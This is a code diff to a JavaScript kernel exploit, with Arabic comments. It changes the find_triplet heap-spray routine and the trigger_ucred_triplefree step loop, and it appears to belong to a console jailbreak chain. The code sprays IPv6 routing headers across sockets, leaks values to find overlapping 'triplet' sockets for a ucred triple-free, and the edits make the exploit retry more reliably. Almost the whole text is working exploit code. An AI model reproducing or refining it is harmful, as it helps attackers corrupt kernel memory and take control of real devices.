@@ -841,29 +841,28 @@ function find_triplet(master, other, iterations) {
 
   while (count < iterations) {
 
+    // رشّ زي التوينز بس مستثني master و other
     for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(spray_add, RTHDR_TAG | i);
       read32(spray_add);
-
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
 
+    // قراءة من master
     write32(leak_add, 0);
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
 
     val = read32(leak_add);
     j = val & 0xFFFF;
 
-    // منع false positives
-    if (j === master || j === other) {
-      count++;
-      continue;
-    }
+    // نفس فلتر التوينز + منع master/other
+    if ((val & 0xFFFF0000) === RTHDR_TAG &&
+        j >= 0 && j < ipv6_socks.length &&
+        j !== master && j !== other) {
 
-    if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
       return j;
     }
 
@@ -1426,21 +1425,22 @@ function trigger_ucred_triplefree() {
     triplets[1] = find_triplet(triplets[0], -1);
 
     if (triplets[1] === -1) {
-      send_notification("[STEP 12] triplet1 NOT FOUND");
-    } else {
-      send_notification("[STEP 12] triplet1 FOUND = " + triplets[1]);
+      send_notification("[STEP 12] triplet1 NOT FOUND → CONTINUE LOOP");
+      continue;
     }
 
-    write(new BigInt(iov_sock_1), tmp, 1);
+    send_notification("[STEP 12] triplet1 FOUND = " + triplets[1]);
 
     // STEP 13
     triplets[2] = find_triplet(triplets[0], triplets[1]);
 
     if (triplets[2] === -1) {
-      send_notification("[STEP 13] triplet2 NOT FOUND");
-    } else {
-      send_notification("[STEP 13] triplet2 FOUND = " + triplets[2]);
+      send_notification("[STEP 13] triplet2 NOT FOUND → CONTINUE LOOP");
+      continue;
     }
+
+    send_notification("[STEP 13] triplet2 FOUND = " + triplets[2]);
+
 
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
